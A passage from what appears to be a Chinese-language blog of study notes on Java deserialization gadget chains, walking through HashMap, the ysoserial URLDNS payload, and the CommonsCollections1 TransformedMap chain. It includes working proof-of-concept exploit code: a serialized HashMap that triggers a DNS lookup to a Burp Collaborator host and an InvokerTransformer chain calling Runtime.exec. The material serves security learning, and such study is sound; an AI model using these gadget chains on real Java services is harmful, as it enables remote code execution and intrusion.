<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(Map&lt;? extends K, ? extends V&gt; m)</span> </span>&#123; <span class="comment">// ä¼ å…¥ä¸€ä¸ªMapç±»å‹çš„å‚æ•°</span></span><br><span class="line">    <span class="keyword">this</span>.loadFactor = DEFAULT_LOAD_FACTOR; <span class="comment">// é»˜è®¤å€¼</span></span><br><span class="line">    putMapEntries(m, <span class="keyword">false</span>); <span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>put</code>æ–¹æ³•ï¼Œåˆ©ç”¨<code>putValue</code>å®ç°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å°ç»“1ï¼šå› ä¸ºè·Ÿç€èµ°äº†ä¸€ä¸‹ï¼Œæ‰€ä»¥å¯¹è¿™ä¸ªé›†åˆç±»æœ‰äº†å¤§æ¦‚çš„äº†è§£ï¼Œæ‰€ä»¥å°±å…ˆçœ‹åˆ°è¿™é‡Œï¼Œç­‰ä¹‹åé‡åˆ°æ–°çš„æ–¹æ³•çš„æ—¶å€™å†è®°å½•åˆ°è¿™é‡Œï¼ˆé¸½</p>
</blockquote>
<h3 id="URL-DNSé“¾"><a href="#URL-DNSé“¾" class="headerlink" title="URL DNSé“¾"></a>URL DNSé“¾</h3><p><del>å†å†å†æ¬¡æ¥èµ°ä¸€éURLDNSé“¾ï¼ï¼ï¼ï¼ï¼</del></p>
<p>urldnsé“¾å­ä¸»è¦æ˜¯åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è§¦å‘<code>HashMap</code>çš„<code>readObject</code>æ–¹æ³•ï¼Œè§¦å‘<code>hash</code>å‡½æ•°ï¼Œä»è€Œå¯ä»¥è§¦å‘<code>URL</code>çš„<code>hashCode</code>æ–¹æ³•è§¦å‘DNSè¯·æ±‚ï¼Œé€šå¸¸ç”¨æ¥éªŒè¯é¢˜ç›®æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´</p>
<p><a href="https://github.com/frohoff/ysoserial">ysoserial</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line">                HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºé“¾å­å·²ç»æ¸…æ¥šï¼Œæ˜¯ååºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨<code>HashMap</code>çš„<code>readObject</code>æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆç›´æ¥çœ‹<code>HashMap</code></p>
<p>é¦–å…ˆæˆ‘ä»¬æ˜¯æŠŠurlå½“ä½œkeyç»™HashMapçš„ï¼Œæ‰€ä»¥å¯ä»¥åªçœ‹æœ€åçš„ä¸€æ®µå†…å®¹ï¼Œå› ä¸ºå‰é¢éƒ½ä¸ä¼šæ¶‰åŠåˆ°keyï¼Œç„¶åæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œåœ¨<code>putvalue</code>çš„æ—¶å€™è°ƒç”¨äº†hashå‡½æ•°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        K key = (K) s.readObject();</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        V value = (V) s.readObject();</span><br><span class="line">    putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>hashå‡½æ•°é‡Œé¢é‡æ–°ç»™hèµ‹å€¼ï¼Œå¹¶ä¸”è°ƒç”¨keyçš„hashCodeæ–¹æ³•ï¼Œè€Œæˆ‘ä»¬å·²ç»çŸ¥é“æ˜¯URL.hashCode()ï¼Œå¯ä»¥ç›´æ¥å»çœ‹çœ‹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>); <span class="comment">// è·å–keyçš„hashCode</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœ<code>hashCode</code>çš„å€¼ä¸ä¸º-1ï¼Œåˆ™ç›´æ¥è¿”å›ï¼Œå¦åˆ™è·³è½¬åˆ°å¦ä¸€ä¸ª<code>hashCode</code>æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰<code>getHostAddress</code>æ–¹æ³•ï¼Œå‚æ•°ä¸ºæˆ‘ä»¬ä¼ å…¥çš„urlï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥çš„ä¸æ˜¯IPV4çš„æ ¼å¼å°±ä¼šè°ƒç”¨<code>getByName</code>,ä»è€Œåœ¨<code>getByName</code>æ—¶å€™é€ æˆå¯¹urlè¿›è¡ŒDNSè§£æè¯·æ±‚</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220325204635981.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> u.getHostAddress();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hostAddress != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> hostAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (host == <span class="keyword">null</span> || host.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        hostAddress = InetAddress.getByName(host); <span class="comment">// æ ¹æ®ä¸»æœºåè·å–ipåå­— è§¦å‘DNSè¯·æ±‚</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnknownHostException | SecurityException ex) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/a230d1786edd444e9f53be8688e9c379.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>æ³¨æ„:</p>
<p>â€‹    1.å½“ä¸€å¼€å§‹URLçš„hashCodeä¸º-1çš„æ—¶å€™ä¹Ÿä¼šè‡ªåŠ¨å‘ç”ŸDNSè¯·æ±‚ï¼Œæ‰€ä»¥åœ¨<code>URLStreamHandler handler = new SilentURLStreamHandler();</code>é‡å†™<code>getHostAddress</code>ï¼Œå°†handlerä¼ ç»™urlï¼Œä½¿å¾—ä¸€å¼€å§‹æ‰§è¡ŒgetHostAddressæ–¹æ³•çš„æ—¶å€™å¹¶ä¸ä¼šå‘ç°DNSè¯·æ±‚ï¼Œä»è€Œé˜²æ­¢äº†ä¸€å¼€å§‹å‘ç”ŸDNSè¯·æ±‚ï¼Œä½†æ˜¯<code>handle</code>åˆæ˜¯ä¸º<code>transient</code>ç±»å‹ï¼Œåœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¸å‚ä¸ï¼Œæ‰€ä»¥åé¢å¹¶ä¸ä¼šå½±å“ååºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨æˆ‘ä»¬éœ€è¦çš„<code>getHostAddress</code>æ–¹æ³•</p>
<p>â€‹    2.è€Œåé¢åˆåœ¨<code>Reflections.setFieldValue(u, &quot;hashCode&quot;, -1);</code>ä¸­è®¾ç½®hashCodeä¸º-1ï¼Œå®ç°åœ¨ååºåˆ—åŒ–ä¹‹å‰å¼ºåˆ¶<code>hashCode</code>ä¸º-1ï¼Œä»è€Œåé¢çš„getHostAddressæ–¹æ³•å¯ä»¥è°ƒç”¨</p>
<p>exp:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;output.txt&quot;</span>));</span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream os = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = os.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, Integer&gt;();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://zy1ok3czhtt8z7qmwpi4xkxiy942sr.burpcollaborator.net&quot;</span>);</span><br><span class="line">        Class c = url.getClass();</span><br><span class="line">        Field field = c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(url,<span class="number">1223</span>);</span><br><span class="line">        hashMap.put(url,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//        hashMap.put(new URL(&quot;http://g0h5mkegjavp1os3y6klz1zz0q6gu5.burpcollaborator.net&quot;), 1);</span></span><br><span class="line">        field.set(url,-<span class="number">1</span>); <span class="comment">// hashcodeæ”¹æˆ-1</span></span><br><span class="line">       </span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;output.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>åè®°ï¼šåˆè¿‡äº†ä¸€éä¹‹åç¡®å®æ¯”ç¬¬ä¸€éä¼šæ›´æ˜ç™½ä¸€äº›ï¼Œä½†æ˜¯è¿˜æœ‰æœ‰ç€ä¸€ç§æ‚¬æµ®æ„Ÿï¼ˆï¼Ÿï¼Œå¦‚æœç¡¬æ˜¯è¦è¯´ä¹Ÿæ˜¯èƒ½æŠŠå¸ˆå‚…ä»¬å¯¹äºè¿™ä¸ªé“¾å­çš„è§£æè¯´å‡ºæ¥ï¼Œä½†æ˜¯è‡ªå·±å´ä¸ä¸€å®šçœŸçš„å®Œå…¨èƒ½ç†è§£å…¶ä¸­çš„ç‚¹ï¼Œæ„Ÿè§‰æ˜¯æ¯”è¾ƒç»†èŠ‚çš„ã€åº•å±‚çš„çŸ¥è¯†è¿˜æ˜¯ä¸å¤Ÿï¼Œç»§ç»­å­¦ä¹ å§ï¼</p>
</blockquote>
<h3 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h3><p>ï¼ˆjdk&lt;8u71</p>
<p>å› ä¸ºysoserialçš„payloadå®åœ¨æœ‰ç‚¹éš¾ä»¥ç†è§£ï¼Œæ‰€ä»¥å…ˆè·ŸPç¥çš„é“¾å­å§</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                                   <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),&#125;;</span><br><span class="line">        </span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>,transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Transformer</code>æ˜¯ä¸€ä¸ªæ¥å£ï¼Œæ–¹æ³•è¿”å›å€¼ç±»ä¸€ä¸ªç±»</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function">Object <span class="title">transform</span><span class="params">(Object var1)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ConstantTransformer</code>æ˜¯å®ç°<code>Transformer</code>å’Œ<code>Serializable</code>æ¥å£çš„ç±»ï¼Œåœ¨æ„é€ çš„æ—¶å€™ä¼ å…¥ä¸€ä¸ªç±»å¹¶åœ¨é‡è½½æ¥å£çš„æ–¹æ³•çš„æ—¶å€™å°†è¿™ä¸ªç±»è¿”å›ï¼Œæ‰€ä»¥ä¸Šé¢çš„<code>new ConstantTransformer(Runtime.getRuntime())</code>ä¼šè¿”å›<code>Runtime.getRuntime()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123; </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">6374440726369055124L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Transformer NULL_INSTANCE = <span class="keyword">new</span> ConstantTransformer((Object)<span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Transformer <span class="title">getInstance</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (Transformer)(constantToReturn == <span class="keyword">null</span> ? NULL_INSTANCE : <span class="keyword">new</span> ConstantTransformer(constantToReturn));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getConstant</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>InvokerTransformer</code>ï¼Œæ„é€ å‡½æ•°é‡Œä¼ å…¥çš„å€¼ä¸ºæ–¹æ³•åã€å‚æ•°ç±»å‹ä»¥åŠå‚æ•°ï¼Œç„¶ååœ¨é‡è½½<code>Transformer</code>çš„æ–¹æ³•çš„æ—¶å€™è¿›è¡Œå¯¹åº”çš„å‡½æ•°è°ƒç”¨ï¼Œå®ç°ä»»æ„æ–¹æ³•è°ƒç”¨</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	Â·Â·Â·Â·Â·</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            Â·Â·Â·Â·Â·Â·</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ChainedTransformer</code>å°†å¤šä¸ª<code>transformers</code>ä¸²è”èµ·æ¥ï¼Œå³å‰ä¸€ä¸ªçš„è¿”å›å€¼å³ä¸ºä¸‹ä¸€ä¸ªçš„å‚æ•°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å†æ¥çœ‹æœ€åå‡ è¡Œçš„ï¼Œå…ˆå»çœ‹ä¸€ä¸‹<code>decorate</code>ï¼Œåªæ˜¯è¿›è¡Œä¸€ä¸ªç±»çš„å®ä¾‹å’Œå±æ€§åˆå§‹åŒ–</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>,transformerChain); <span class="comment">// å®ä¾‹åŒ–ä¸€ä¸ªæ–°çš„TransformedMap</span></span><br><span class="line">outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer); <span class="comment">// å°†mapä¼ ç»™çˆ¶ç±»ï¼Œå…¶ä»–ç”¨äºåˆå§‹åŒ–ï¼Œ</span></span><br><span class="line">    <span class="comment">// this.valueTransformer = transformerChain;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AbstractMapDecorator</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">AbstractMapDecorator</span><span class="params">(Map map)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (map == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Map must not be null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€åé€šè¿‡è°ƒç”¨<code>put</code>ä¼ å…¥æ–°çš„æ˜ å°„åœ¨<code>transformValue</code>äº§ç”Ÿå›è°ƒ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">put</span><span class="params">(Object key, Object value)</span> </span>&#123;</span><br><span class="line">    key = <span class="keyword">this</span>.transformKey(key);</span><br><span class="line">    value = <span class="keyword">this</span>.transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getMap().put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">transformValue</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer == <span class="keyword">null</span> ? object : <span class="keyword">this</span>.valueTransformer.transform(object);</span><br><span class="line">    <span class="comment">// å®ç°è°ƒç”¨ transformerChain.transform(String)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®ç°è°ƒç”¨<code>ChainedTransformer.transform</code>ï¼Œä¹‹åæ ¹æ®<code>this.iTransformers[i]</code>ä¾æ¬¡è°ƒç”¨<code>ConstantTransformer.transform</code>|<code>InvokerTransformer.transform</code></p>
